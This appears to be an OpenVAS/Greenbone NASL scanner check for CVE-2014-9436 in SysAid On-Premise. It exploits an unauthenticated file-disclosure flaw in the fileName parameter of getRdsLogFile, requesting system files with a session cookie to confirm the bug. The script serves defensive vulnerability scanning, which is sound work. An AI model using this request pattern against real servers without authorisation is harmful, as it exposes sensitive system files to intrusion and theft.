CPE = "cpe:/a:sysaid:sysaid";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105938" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-01-13 16:45:50 +0700 (Tue, 13 Jan 2015)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2014-9436" );
	script_name( "SysAid < 14.4.2 Arbitrary File Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_sysaid_detect.sc" );
	script_mandatory_keys( "sysaid/detected" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/35593/" );
	script_tag( name: "summary", value: "SysAid On-Premise is prone to an arbitrary file
  disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check the response." );
	script_tag( name: "insight", value: "SysAid On-Premise is vulnerable to an unauthenticated file
  disclosure attack in the fileName parameter of getRdsLogFile." );
	script_tag( name: "impact", value: "An unauthenticated attacker may read arbitrary files which may contain
  sensitive information." );
	script_tag( name: "affected", value: "SysAid On-Premise before 14.4.2." );
	script_tag( name: "solution", value: "Upgrade to version 14.4.2 or above." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
req = http_get( item: NASLString( dir, "/Login.jsp" ), port: port );
res = http_keepalive_send_recv( port: port, data: req );
sessionid = eregmatch( string: res, pattern: "JSESSIONID=([^;]+)" );
if(isnull( sessionid[1] )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/getRdsLogFile?fileName=/" + file;
	req = "GET " + url + " HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" + "Accept-Language: en-US,en;q=0.5\r\n" + "Accept-Encoding: gzip, deflate\r\n" + "Cookie: JSESSIONID=" + sessionid[1] + "\r\n" + "Connection: keep-alive\r\n\r\n";
	res = http_keepalive_send_recv( port: port, data: req );
	if(res && egrep( string: res, pattern: pattern )){
		report = http_report_vuln_url( url: url, port: port );
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 99 );

